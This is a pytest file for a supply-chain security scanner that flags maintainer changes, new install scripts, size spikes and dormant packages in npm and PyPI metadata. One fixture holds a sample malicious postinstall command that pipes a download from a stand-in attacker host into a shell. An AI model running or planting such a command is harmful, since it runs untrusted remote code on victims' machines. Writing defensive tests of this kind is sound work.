"""Tests for thresher.scanners.registry_meta."""

from __future__ import annotations

from unittest.mock import patch

from thresher.scanners.registry_meta import (
    parse_registry_meta_output,
    run_registry_meta,
    _REGISTRY_META_SCRIPT,
)
from thresher.vm.ssh import SSHResult


class TestParseRegistryMetaOutput:
    def test_empty_output(self):
        raw = {"scanner": "registry-meta", "findings": [], "total": 0}
        assert parse_registry_meta_output(raw) == []

    def test_maintainer_change(self):
        raw = {
            "scanner": "registry-meta",
            "findings": [
                {
                    "type": "maintainer_change",
                    "package": "hijacked-pkg",
                    "ecosystem": "npm",
                    "severity": "high",
                    "description": "Maintainer change between 1.0.0 and 1.0.1",
                    "detail": {"removed": ["original-author"], "added": ["new-person"]},
                }
            ],
        }
        findings = parse_registry_meta_output(raw)
        assert len(findings) == 1
        assert findings[0].category == "metadata"
        assert findings[0].severity == "high"
        assert findings[0].package_name == "hijacked-pkg"

    def test_install_script_introduced(self):
        raw = {
            "scanner": "registry-meta",
            "findings": [
                {
                    "type": "install_script_introduced",
                    "package": "sneaky-pkg",
                    "ecosystem": "npm",
                    "severity": "critical",
                    "description": "Install scripts introduced in 2.0.0",
                    "detail": {"scripts": {"postinstall": "curl evil.com | sh"}},
                }
            ],
        }
        findings = parse_registry_meta_output(raw)
        assert len(findings) == 1
        assert findings[0].severity == "critical"

    def test_tarball_size_spike(self):
        raw = {
            "scanner": "registry-meta",
            "findings": [
                {
                    "type": "tarball_size_spike",
                    "package": "bloated-pkg",
                    "ecosystem": "npm",
                    "severity": "medium",
                    "description": "Package size increased 15x",
                    "detail": {"ratio": 15.0},
                }
            ],
        }
        findings = parse_registry_meta_output(raw)
        assert findings[0].severity == "medium"
        assert "tarball_size_spike" in findings[0].title

    def test_pypi_vulnerabilities(self):
        raw = {
            "scanner": "registry-meta",
            "findings": [
                {
                    "type": "pypi_known_vulnerabilities",
                    "package": "vuln-pkg",
                    "ecosystem": "pypi",
                    "severity": "high",
                    "description": "PyPI reports 3 known vulnerabilities",
                    "detail": {"count": 3, "ids": ["PYSEC-2024-1"]},
                }
            ],
        }
        findings = parse_registry_meta_output(raw)
        assert findings[0].severity == "high"

    def test_dormant_reactivation_pypi(self):
        raw = {
            "scanner": "registry-meta",
            "findings": [
                {
                    "type": "dormant_reactivation",
                    "package": "old-pypi-pkg",
                    "ecosystem": "pypi",
                    "severity": "medium",
                    "description": "Package dormant for 400 days",
                    "detail": {"gap_days": 400},
                }
            ],
        }
        findings = parse_registry_meta_output(raw)
        assert findings[0].category == "metadata"

    def test_multiple_findings_unique_ids(self):
        raw = {
            "scanner": "registry-meta",
            "findings": [
                {"type": "maintainer_change", "package": "a", "ecosystem": "npm",
                 "severity": "high", "description": "changed"},
                {"type": "tarball_size_spike", "package": "b", "ecosystem": "npm",
                 "severity": "medium", "description": "big"},
            ],
        }
        findings = parse_registry_meta_output(raw)
        assert len(findings) == 2
        assert findings[0].id != findings[1].id


class TestRegistryMetaScript:
    """Tests for the embedded registry metadata scanner script."""

    def test_script_searches_multiple_manifest_paths(self):
        """The script should search /opt/deps/ and /opt/target/ for manifests."""
        assert "/opt/deps/dep_manifest.json" in _REGISTRY_META_SCRIPT
        assert "/opt/target/package-lock.json" in _REGISTRY_META_SCRIPT
        assert "/opt/target/package.json" in _REGISTRY_META_SCRIPT

    def test_script_logs_searched_paths_on_no_manifests(self):
        """When no manifests found, script should report searched paths."""
        assert "WARNING: No manifests found" in _REGISTRY_META_SCRIPT

    def test_script_outputs_warning_field_when_empty(self):
        """When no packages found, output should include warning field."""
        assert '"warning"' in _REGISTRY_META_SCRIPT

    def test_script_has_package_json_parser(self):
        """Script should parse package.json as fallback."""
        assert "_parse_package_json" in _REGISTRY_META_SCRIPT


class TestRunRegistryMeta:
    @patch("thresher.scanners.registry_meta.ssh_write_file")
    @patch("thresher.scanners.registry_meta.ssh_exec")
    def test_success(self, mock_exec, mock_write):
        mock_exec.return_value = SSHResult("Checking 3 packages...", "", 0)
        mock_write.return_value = None

        result = run_registry_meta("vm", "/opt/scan-results")

        assert result.tool_name == "registry-meta"
        assert result.exit_code == 0
        assert result.raw_output_path == "/opt/scan-results/registry-meta.json"

    @patch("thresher.scanners.registry_meta.ssh_write_file")
    @patch("thresher.scanners.registry_meta.ssh_exec")
    def test_failure(self, mock_exec, mock_write):
        mock_exec.return_value = SSHResult("", "error", 1)
        mock_write.return_value = None

        result = run_registry_meta("vm", "/opt/scan-results")

        assert result.exit_code == 1
        assert len(result.errors) > 0

    @patch("thresher.scanners.registry_meta.ssh_write_file")
    @patch("thresher.scanners.registry_meta.ssh_exec")
    def test_exception_handled(self, mock_exec, mock_write):
        mock_write.side_effect = RuntimeError("connection lost")

        result = run_registry_meta("vm", "/opt/scan-results")
        assert result.exit_code == -1
        assert len(result.errors) > 0
